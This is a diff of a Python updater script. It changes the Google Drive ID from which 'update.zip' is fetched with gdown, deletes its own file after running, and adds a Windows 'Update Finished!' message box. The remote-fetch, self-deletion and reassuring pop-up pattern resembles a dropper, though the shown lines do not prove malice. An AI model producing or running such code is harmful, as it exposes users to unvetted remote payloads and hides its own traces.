@@ -2,8 +2,9 @@
 import gdown
 import zipfile
 import os
+import ctypes
 
-url = "https://drive.google.com/uc?id=1tDdTft3_EGy_ui8qCCu5jg8wq5xfz4IO&export=download"
+url = "https://drive.google.com/uc?id=1iK2jZYWuH8n3WZWoRvHjfhfhWAHatREy&export=download"
 
 destination = "update.zip"
 
@@ -18,3 +19,4 @@ except:
 
 file_path = os.path.realpath(__file__)
 os.remove(file_path)
+ctypes.windll.user32.MessageBoxW(None, "Update Finished!", "Info", 0x40 | 0x0 | 0x1000)
